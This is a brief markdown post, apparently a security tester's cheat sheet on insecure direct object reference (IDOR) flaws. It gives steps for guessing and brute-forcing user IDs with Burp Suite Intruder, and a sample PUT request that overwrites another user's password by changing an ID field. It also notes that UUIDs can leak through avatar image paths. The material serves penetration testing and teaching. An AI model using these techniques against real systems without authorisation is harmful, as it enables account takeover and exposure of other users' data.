---
layout: post
title: "idor"
keywords: "idor, insecure direct object reference"
---
#### GET

https://example.com/api/user/`12345`/address

1. Guess other IDs
1. Check if it can be decoded in CyberChef
1. Brute with BurpSuite Intruder


#### POST / PUT

```
PUT https://example.com/api/user/profile HTTP/1.1
{
    "id": 12345,
    "password": "hacked"
}

Response: {"success":true}
```

#### Leaked UUIDs
&lt;img src="/assets/profile_picture/`uuid`/avatar.png">
